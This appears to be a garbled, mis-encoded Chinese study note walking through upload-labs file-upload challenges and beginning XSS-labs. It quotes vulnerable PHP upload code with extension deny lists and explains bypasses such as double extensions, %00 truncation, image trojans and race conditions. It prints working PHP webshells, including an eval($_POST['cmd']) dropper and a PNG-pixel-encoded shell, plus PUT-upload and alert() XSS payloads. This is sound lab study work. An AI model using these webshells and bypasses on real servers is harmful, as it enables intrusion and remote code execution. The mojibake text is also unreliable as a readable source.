array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º #å°†æ–‡ä»¶åè¿›è¡Œè¿‡æ»¤æ“ä½œåï¼Œå°†æ–‡ä»¶åæ‹¼æ¥åœ¨è·¯å¾„åé¢ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡å‰é¢çš„é¦–å°¾å»ç©ºä»¥åŠå»ç‚¹ã€‚ ä¸Šä¼ æ–‡ä»¶åä¸º .php. .(ç‚¹+php+ç‚¹+ç©ºæ ¼+ç‚¹) trim()ï¼šä»…åˆ é™¤å­—ç¬¦ä¸²é¦–å°¾çš„åŠè§’ç©ºæ ¼ï¼ˆU+0020ï¼‰ã€\\tã€\\nã€\\rï¼Œä¸å¤„ç†ç‚¹ã€ä¸­é—´ç©ºæ ¼ï¼›deldot()ï¼ˆå¸¸è§„å®ç°ï¼‰ï¼šä»…å¾ªç¯åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼ˆ.ï¼‰ï¼Œç›´åˆ°æœ€åä¸€ä¸ªå­—ç¬¦ä¸æ˜¯ç‚¹ä¸ºæ­¢ï¼›strrchr($str, '.')ï¼šæ‰¾å­—ç¬¦ä¸²ä¸­ã€Œæœ€åä¸€ä¸ª .ã€ï¼Œè¿”å›è¯¥ç‚¹åˆ°å­—ç¬¦ä¸²æœ«å°¾çš„æ‰€æœ‰å†…å®¹ï¼›Windows æ–‡ä»¶ç³»ç»Ÿï¼šå¼ºåˆ¶è§„èŒƒåŒ–æ–‡ä»¶å â†’ å…ˆåˆ æœ«å°¾æ‰€æœ‰ç©ºæ ¼ â†’ å†åˆ æœ«å°¾æ‰€æœ‰ç‚¹ less-1112345678ä»£ç åˆ†æï¼š $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);#å°†è¿™äº›æ‰©å±•åä»æ–‡ä»¶åä¸­ç§»é™¤ $temp_file = $_FILES['upload_file']['tmp_name']; åˆ©ç”¨str_ireplace()å°†æ–‡ä»¶åä¸­ç¬¦åˆé»‘åå•çš„å­—ç¬¦ä¸²æ›¿æ¢æˆç©ºåˆ©ç”¨æ–¹å¼ï¼šåˆ©ç”¨åŒå†™é»‘åå•å­—ç¬¦ï¼Œå¯¹å­—ç¬¦ä¸²çš„ä¸€æ¬¡è¿‡æ»¤åæ‹¼æ¥å‡ºphp,æ–‡ä»¶å`.pphphp` str_ireplaceå‡½æ•°çš„é—®é¢˜ç›´æ¥ 12.pphphpä¼šåŒ¹é…phpåˆ é™¤æ‰ less-12å‰æéœ€è¦phpçš„ç‰ˆæœ¬å·ä½äº5.3.29ï¼Œä¸”magic_quotes_gpcä¸ºå…³é—­çŠ¶æ€ï¼ˆéœ€è¦è‡ªå·±å…³é—­ï¼‰å»php.iniä¿®æ”¹ 1magic_quotes_gpc = Off ä¸Šä¼ å›¾ç‰‡åˆ†ææ•°æ®åŒ…ï¼Œä½¿ç”¨ç™½åå•é™åˆ¶ä¸Šä¼ æ–‡ä»¶ç±»å‹ï¼Œä½†ä¸Šä¼ æ–‡ä»¶çš„å­˜æ”¾è·¯å¾„å¯æ§åˆ©ç”¨æ–¹æ³•ï¼šè®¾ç½®ä¸Šä¼ è·¯å¾„ä¸ºupload/12.php%00 ,æ·»åŠ 12.php%00å†…å®¹ä¸ºäº†æ§åˆ¶è·¯å¾„ï¼Œä¸Šä¼ æ–‡ä»¶åç¼€ä¸ºç™½åå•å³å¯ ä¾‹:12.pngï¼Œä¿å­˜åä¸º/upload/12.php%00*****.pngï¼Œä½†æœåŠ¡ç«¯è¯»å–åˆ°%00æ—¶ä¼šè‡ªåŠ¨ç»“æŸï¼Œå°†æ–‡ä»¶å†…å®¹ä¿å­˜è‡³12.phpä¸­ 1234567891011121314ä»£ç åˆ†æï¼šif(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].&quot;/&quot;.ra![](https://cdn.nlark.com/yuque/0/2025/png/62156892/1765972093905-116673fb-9be6-43f0-97f5-8b9fdb5a21e5.png)nd(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;çŸ¥è¯†è¡¥å……ï¼šphpçš„ä¸€äº›å‡½æ•°çš„åº•å±‚æ˜¯Cè¯­è¨€ï¼Œè€Œmove_uploaded_fileå°±æ˜¯å…¶ä¸­ä¹‹ä¸€ï¼Œé‡åˆ°0x00ä¼šæˆªæ–­ï¼Œ0xè¡¨ç¤º16è¿›åˆ¶ï¼ŒURLä¸­%00è§£ç æˆ16è¿›åˆ¶å°±æ˜¯0x00ã€‚strrpos(string,find[,start]) å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚substr(string,start[,length])å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†(ä»startå¼€å§‹ [ï¼Œé•¿åº¦ä¸ºlength])magic_quotes_gpc ç€é‡åå‘æ•°æ®åº“æ–¹é¢ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢sqlæ³¨å…¥ï¼Œä½†magic_quotes_gpcå¼€å¯è¿˜ä¼šå¯¹$_REQUEST, $_GET,$_POST,$_COOKIE è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤ less-1312ç¬¬13é¢˜ä¸12é¢˜æ€è·¯ä¸€æ ·ä½¿ç”¨ç™½åå•é™åˆ¶ä¸Šä¼ æ–‡ä»¶ç±»å‹ï¼Œä½†ä¸Šä¼ æ–‡ä»¶çš„å­˜æ”¾è·¯å¾„å¯æ§ï¼Œä½†å› ä¸ºæ˜¯POSTå‹ï¼Œéœ€è¦å¯¹%00è¿›è¡Œè§£ç æˆ–åœ¨16è¿›åˆ¶ä¸­ä¿®æ”¹ï¼ŒPOSTä¸ä¼šåƒGETé‚£æ ·å¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ã€‚ less-14æœ¬å…³ä¼šè¯»å–åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶çš„å‰ä¸¤ä¸ªå­—èŠ‚ï¼Œåˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹ï¼Œå¹¶ä¸”åç«¯ä¼šæ ¹æ®åˆ¤æ–­å¾—åˆ°çš„æ–‡ä»¶ç±»å‹é‡å‘½åä¸Šä¼ æ–‡ä»¶ä½¿ç”¨ å›¾ç‰‡é©¬ + æ–‡ä»¶åŒ…å« ç»•è¿‡ 123456789è¡¥å……ï¼šPngå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬8å­—èŠ‚ï¼š89 50 4E 47 0D 0A 1A 0Aã€‚å³ä¸º .PNGJpgå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬2å­—èŠ‚ï¼šFF D8ã€‚Gifå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬6å­—èŠ‚ï¼š47 49 46 38 39|37 61 ã€‚å³ä¸º GIF89(7)aã€‚Bmpå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬2å­—èŠ‚ï¼š42 4Dã€‚å³ä¸º BM å›¾ç‰‡é©¬åˆ¶ä½œï¼šåœ¨cmdé‡Œæ‰§è¡Œ **copy logo.jpg/b+test.php/a test.jpg**#logo.jpgä¸ºä»»æ„å›¾ç‰‡ï¼›test.php æ’å…¥çš„æœ¨é©¬æ–‡ä»¶ï¼›test.jpg ç”Ÿæˆçš„å›¾ç‰‡æœ¨é©¬ ä¸Šä¼ å®Œå¤åˆ¶æ–‡ä»¶è·¯å¾„ï¼Œç‚¹å‡»ä¸Šå›¾é»„è‰²çš„æ–‡ä»¶åŒ…å«æ¼æ´ åˆ†æä»£ç å¯ä»¥çŸ¥é“getä¼ å‚ï¼Œå‚æ•°æ˜¯fileï¼Œæ„é€ å¦‚ä¸‹å›¾å‚æ•° less-15æŸ¥çœ‹æç¤ºï¼š æœ¬passä½¿ç”¨getimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ï¼ 12getimagesize() å‡½æ•°ç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚ä¸»è¦æ˜¯é’ˆå¯¹*.phpç›´æ¥æ›´æ”¹æ–‡ä»¶åç¼€ä¸ºå›¾ç‰‡åç¼€ï¼Œä¸Šä¸€é¢˜åˆ›å»ºçš„å›¾ç‰‡é©¬ä»ç„¶å¯ä»¥ä½¿ç”¨ã€‚ æ–¹æ³•åŒPass-14 less-16ï¼ˆéœ€è¦å¼€å¯php_exifæ¨¡å—ï¼‰12exif_imagetype()è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶åç¼€åã€‚è¿”å›å€¼ä¸getimage()å‡½æ•°è¿”å›çš„ç´¢å¼•2ç›¸åŒï¼Œä½†æ˜¯é€Ÿåº¦æ¯”getimageå¿« æ–¹æ³•åŒPass-14 æ„é€ ä¸€ä¸ªgifé©¬ less-17äºŒæ¬¡æ¸²æŸ“ 1234ä¸Šä¼ â†’éªŒè¯â†’æ¸²æŸ“é‡ç”Ÿæˆâ†’åˆ é™¤åŸæ–‡ä»¶â†’ä¿å­˜æ–°æ–‡ä»¶1. **åç¼€ + Content-Type æ ¡éªŒå¯ä¼ªé€ **ï¼š`$fileext`ï¼ˆåç¼€ï¼‰å’Œ`$filetype`ï¼ˆContent-Typeï¼‰éƒ½æ˜¯å‰ç«¯ / è¯·æ±‚å¤´å¯æ§çš„ï¼Œæ”»å‡»è€…å¯è½»æ˜“å°† PHP æ–‡ä»¶ä¼ªè£…ä¸º`1.jpg`ï¼Œå¹¶ä¼ªé€  Content-Type ä¸º`image/jpeg`ï¼›2. **GD åº“éªŒè¯ä»… â€œè¯†åˆ«å›¾ç‰‡â€ï¼Œä¸ â€œæ¸…ç†ä»£ç â€**ï¼š`imagecreatefromjpeg/png/gif`çš„ä½œç”¨æ˜¯ â€œåˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºåˆæ³•å›¾ç‰‡æ ¼å¼â€ï¼ˆåªè¦ GD åº“èƒ½è§£æå‡ºå›¾ç‰‡åƒç´ ï¼Œå°±è¿”å›é falseï¼‰ï¼Œä½†å®ƒ**ä¸ä¼šæ£€æŸ¥ / åˆ é™¤å›¾ç‰‡ä¸­åµŒå…¥çš„éå›¾ç‰‡æ•°æ®ï¼ˆå¦‚ PHP ä»£ç ï¼‰**ï¼›3. **äºŒæ¬¡æ¸²æŸ“ä»… â€œé‡ç»˜å›¾ç‰‡â€ï¼Œä¸ â€œæ¸…ç©ºæ–‡ä»¶â€**ï¼šæ–°ç”Ÿæˆçš„å›¾ç‰‡æ–‡ä»¶ï¼ˆå¦‚`rand().jpg`ï¼‰ä¼šä¿ç•™ä¸Šè¿° â€œå®‰å…¨åŒºåŸŸâ€ çš„ PHP ä»£ç  â€”â€” å› ä¸º GD åº“åªé‡ç»˜åƒç´ æ•°æ®ï¼Œä¸ä¼šä¿®æ”¹æ³¨é‡Šã€EOI åç­‰éåƒç´ åŒºåŸŸçš„å†…å®¹ã€‚ ä¼ less-16çš„ç å­ä¸è¡Œ upload-labsä¹‹pass 16è¯¦ç»†åˆ†æ-å…ˆçŸ¥ç¤¾åŒº åŠ åœ¨ç›¸åŒçš„åœ°æ–¹åé¢ 1include.php/?file=upload/4520251216222228.gif è„šæœ¬åé¢å†ç ”ç©¶ç ”ç©¶ 12345678910111213141516171819202122232425262728293031&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y &lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);}imagepng($img,'1.png'); //è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„ /* æœ¨é©¬å†…å®¹&lt;?$_GET[0]($_POST[1]);?&gt; *///imagepng($img,'1.png'); è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„,1.pngæ˜¯ä½¿ç”¨çš„æ–‡ä»¶ï¼Œå¯ä»¥ä¸å­˜åœ¨//ä¼šåœ¨ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª1.pngå›¾ç‰‡//å›¾ç‰‡è„šæœ¬å†…å®¹ï¼š$_GET[0]($_POST[1]);//ä½¿ç”¨æ–¹æ³•ï¼šä¾‹å­ï¼šæŸ¥çœ‹å›¾ç‰‡ï¼Œgetä¼ å…¥0=systemï¼›postä¼ å…¥tac flag.php?&gt; less-1812345678910111213141516171819202122$is_upload = false; $msg = null; if(isset($_POST['submit'])){ // æ£€æŸ¥æ˜¯å¦æäº¤äº†ä¸Šä¼ è¡¨å•ï¼Œå¦‚æœæäº¤äº†åˆ™æ‰§è¡Œä¸‹é¢çš„ä»£ç å— $ext_arr = array('jpg','png','gif'); // å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹æ•°ç»„ï¼ŒåŒ…æ‹¬jpgï¼Œpngï¼Œgif $file_name = $_FILES['upload_file']['name']; // ä»ä¸Šä¼ è¡¨å•ä¸­è·å–ä¸Šä¼ æ–‡ä»¶çš„åå­— $temp_file = $_FILES['upload_file']['tmp_name']; // ä»ä¸Šä¼ è¡¨å•ä¸­è·å–ä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶è·¯å¾„ $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); // è·å–ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•åï¼Œå³æ–‡ä»¶åçš„æœ€åéƒ¨åˆ† $upload_file = UPLOAD_PATH . '/' . $file_name; // æ‹¼æ¥å‡ºä¸Šä¼ æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼Œåˆ›å»ºä»¥åŸæ–‡ä»¶åä¸ºåçš„æ–‡ä»¶ if(move_uploaded_file($temp_file, $upload_file)){ // å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šçš„è·¯å¾„ï¼Œå¦‚æœç§»åŠ¨æˆåŠŸåˆ™æ‰§è¡Œ if(in_array($file_ext,$ext_arr)){ // æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•åæ˜¯å¦åœ¨å…è®¸çš„ç±»å‹æ•°ç»„ä¸­ï¼Œå¦‚æœåœ¨åˆ™æ‰§è¡Œä¸‹é¢çš„ä»£ç å— $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; #ç”Ÿæˆæ–°çš„æ–‡ä»¶åï¼ŒåŒ…æ‹¬éšæœºæ•°å­—ã€å½“å‰æ—¥æœŸå’Œæ—¶é—´ä»¥åŠåŸæ–‡ä»¶çš„æ‰©å±•å rename($upload_file, $img_path); // å°†ä¸Šä¼ çš„æ–‡ä»¶é‡å‘½åä¸ºæ–°çš„æ–‡ä»¶å $is_upload = true; }else{ // å¦‚æœä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•åä¸åœ¨å…è®¸çš„ç±»å‹æ•°ç»„ä¸­ï¼Œåˆ™è®¾ç½®é”™è¯¯æ¶ˆæ¯ï¼Œå¹¶åˆ é™¤ä¸Šä¼ çš„æ–‡ä»¶ $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; unlink($upload_file); } }else{ $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } å°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡renameä¿®æ”¹åç§°ï¼Œå†é€šè¿‡unlinkåˆ é™¤æ–‡ä»¶ï¼Œå› æ­¤å¯é€šè¿‡æ¡ä»¶ç«äº‰çš„æ–¹å¼åœ¨unlinkä¹‹å‰ï¼Œè®¿é—®webshellã€‚ç›´æ¥BurpSuiteä¸Šçˆ†ç ´ï¼Œæˆ–è€…å†™è„šæœ¬éƒ½ä¸€æ ·çš„ 123&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[&quot;cmd&quot;]) ?&gt;');?&gt; çˆ†ç ´è®¿é—®é©¬å­è·¯å¾„ï¼Œåˆ©ç”¨æ­£åœ¨è®¿é—®çš„æ–‡ä»¶ä¸ä¼šè¢«åˆ æ‰çš„æ€§è´¨ ç®—äº†BurpSuiteçˆ†ç ´çš„è¯æ˜¯è¦ä½ ä¸€ç›´å»è®¿é—®é‚£ä¸ªé©¬æ‰ä¸ä¼šè¢«åˆ æ‰ï¼Œæœ‰ç‚¹è ¢äº†ï¼Œå†™è„šæœ¬å¥½äº› æ¡ä»¶ç«äº‰çš„éªšæ“ä½œ(ä¸€)-å…ˆçŸ¥ç¤¾åŒº less-19åŒæ ·å­˜åœ¨æ¡ä»¶ç«äº‰ é€šè¿‡åˆ†ææºä»£ç å‘ç°åç¼€ååšäº†ç™½åå•åˆ¤æ–­ï¼Œç„¶åä¼šä¸€æ­¥ä¸€æ­¥æ£€æŸ¥æ–‡ä»¶å¤§å°ã€æ–‡ä»¶æ˜¯å¦å­˜åœ¨ç­‰ç­‰ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åï¼Œå¯¹æ–‡ä»¶é‡æ–°å‘½åï¼ŒåŒæ ·å­˜åœ¨æ¡ä»¶ç«äº‰çš„æ¼æ´ã€‚å¯ä»¥ä¸æ–­åˆ©ç”¨burpå‘é€ä¸Šä¼ å›¾ç‰‡é©¬çš„æ•°æ®åŒ…ï¼Œç”±äºæ¡ä»¶ç«äº‰ï¼Œç¨‹åºä¼šå‡ºç°æ¥ä¸åŠrenameçš„é—®é¢˜ï¼Œç„¶åå†ä¸æ–­é€šè¿‡include.phpä¸æ–­åŒ…å«ä¸Šä¼ çš„æ–‡ä»¶ï¼ˆæ³¨æ„ä¸Šä¼ åçš„æ–‡ä»¶åï¼šuploadxxx.jpgï¼‰ä»è€Œä»è€Œç”Ÿæˆæœ¨é©¬ã€‚ åŒºåˆ«äºPass-18,è¿™é‡Œéœ€è¦ä½¿ç”¨ä¸Šä¸€é¢˜çš„phpä»£ç ç”Ÿæˆå›¾ç‰‡é©¬æµ‹è¯•å‘ç°é‡å‘½ååçš„å›¾ç‰‡é©¬ä¾æ—§å¯ä»¥è¢«æ–‡ä»¶åŒ…å«ï¼Œä»è€Œç”Ÿæˆshell.php 123&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[&quot;cmd&quot;]) ?&gt;');?&gt; less-20Linuxç¯å¢ƒWindowsç¯å¢ƒä¸‹ä½¿ç”¨/.ç»•è¿‡ï¼Œ 12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } }else{ $msg = 'ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; }} åˆ†æä»£ç å¯çŸ¥ï¼šæ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶åšåˆ¤æ–­ï¼Œåªå¯¹ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶ååšåˆ¤æ–­ï¼Œåç¼€åé»‘åå•ä¸Šä¼ çš„æ–‡ä»¶åç”¨æˆ·å¯æ§ï¼Œé»‘åå•ç”¨äºç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶åç¼€åè¿›è¡Œåˆ¤æ–­ 1move_uploaded_file()ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„ /.ï¼Œä¸»è¦ä½œç”¨æ˜¯å°†ä¸´æ—¶æ–‡ä»¶ç§»åˆ°æŒ‡å®šçš„ç›®æ ‡è·¯å¾„ï¼Œå¹¶ç¡®ä¿æ–‡ä»¶åœ¨ç§»åŠ¨ä¸­ä¸ä¼šè¢«åˆ é™¤æˆ–è¦†ç›–ã€‚ è¿™é‡ŒWindowsä¸è¦ç”¨%00ç›´æ¥ç”¨/.å°±å¯ä»¥ç»•è¿‡Â·Â·Â·Â· less-21123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES['upload_file'])){ //æ£€æŸ¥MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type)){ $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;; }else{ //æ£€æŸ¥æ–‡ä»¶å $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;; $is_upload = true; } else { $msg = &quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;; } } }}else{ $msg = &quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;;} æ£€æŸ¥MIME(ä¿®æ”¹content-type)åˆ¤æ–­POSTå‚æ•°save_nameæ˜¯å¦ä¸ºç©ºåˆ¤æ–­$fileæœ€åä¸€ä¸ªå…ƒç´ æ˜¯å¦ä¸ºæ•°ç»„ ä¸Šä¼ åæ–‡ä»¶åqwe.php putæ–¹æ³•æ¼æ´ä¸Šä¼ webshellputä¸Šä¼ æ–‡ä»¶ HTTP1.0å®šä¹‰äº†ä¸‰ç§è¯·æ±‚æ–¹æ³•ï¼šGET,POSTå’ŒHEADæ–¹æ³•ã€‚HTTP1.1æ–°å¢äº†äº”ç§è¯·æ±‚æ–¹æ³•ï¼šOPTIONS,PUT,DELETE,TRACEå’ŒCONNECTæ–¹æ³•ã€‚HTTPä¹ç§è¯·æ±‚æ–¹æ³•çš„åŠŸèƒ½ç”¨é€”ä¸ç‰¹æ€§è¯¦è§£-å¼€å‘è€…ç¤¾åŒº-é˜¿é‡Œäº‘ å¦‚æœæœåŠ¡å™¨å­˜åœ¨a.phpä¸Šä¼ a.phpå°±ä¼šæ›¿æ¢æ‰æŠŠ 123telent ip ç«¯å£OPTIONS / HTTP/1.1HOST: IP æŸ¥çœ‹å¼€æ”¾ 1nikto -h ç½‘ç«™ bç«™ wå•¥éƒ½å­¦ XSSlabsåŸºç¡€xssï¼Œè·¨ç«™è„šæœ¬æ”»å‡» åµŒå…¥ç½‘é¡µï¼Œä¸»è¦æ”»å‡»å®¢æˆ·ç«¯ ç”¨æˆ·åä¿¡æ¯é”®ç›˜è¯¦ç»†cookieå¯†ç  1.request2.å›index.html,index.php è¯»å–å®¢æˆ·æƒ³è¦è®¿é—®çš„é¡µé¢3.æµè§ˆå™¨è§£ææ‰§è¡Œhtmlå±•ç¤ºé¡µé¢æ•ˆæœ response æ”»å‡»ä»£ç ä¸€èˆ¬æ˜¯å‰ç«¯jsä»£ç æµè§ˆå™¨è§£ææ”»å‡»ä»£ç 1.è·å–ç”¨æˆ·åå¯†ç 2.å‘é€ç»™hacker3.åŸºäºä½ çš„èº«ä»½ç™»å½•ï¼Œç³»ç»Ÿå¦‚æœæ˜¯åå°ç®¡ç†å‘˜ç³»ç»Ÿï¼Œä¸ºæ‰€æ¬²ä¸º å‰ç«¯Javascriptï¼ŒVBscript XSSåˆ†ç±»åå°„å‹ï¼ŒDomå‹ï¼Œå­˜å‚¨å‹ æœ‰è¾“å…¥è¾“å‡ºçš„åœ°æ–¹éƒ½å¯ä»¥å°è¯•XSSï¼Œæœ‰è¾“å‡ºå¯ä»¥åšxss å­˜å‚¨å‹ï¼š å‘é€ä¸€æ®µjsä»£ç ï¼ŒæœåŠ¡å™¨ä¿å­˜åˆ°æ•°æ®åº“é‡Œé¢äº†ï¼Œä¸€èˆ¬åœ¨ç•™è¨€æ¿ï¼Œè¯„è®ºåŒºï¼Œæ³¨å†Œç­‰é¡µé¢ï¼Œå­˜å‚¨å‹åå°„å‹ï¼š å‘äº†ä»€ä¹ˆï¼Œç„¶åæœåŠ¡å™¨ç›´æ¥è¿”å›åˆ°å®¢æˆ·ç«¯äº†ï¼Œä¸€æ¬¡æ€§ ï¼Œä¸€èˆ¬åœ¨æŸ¥è¯¢ç±»é¡µé¢ï¼Œè¿™å«åå°„å‹DOMå‹ï¼Œåˆæœ‰åå°„ï¼Œåˆæœ‰å­˜å‚¨ è¾“å…¥jaden ç›´æ¥è¿”å›jaden ç‚¹ä¸‹é¢è¿™ä¸ªç›´æ¥æ‰¾åˆ°inputæ ‡ç­¾çš„ä»£ç  è¿™ä¸ªinputåšäº†é•¿åº¦é™åˆ¶ä¿®æ”¹ 1&lt;script&gt;alert(123);&lt;/script&gt; 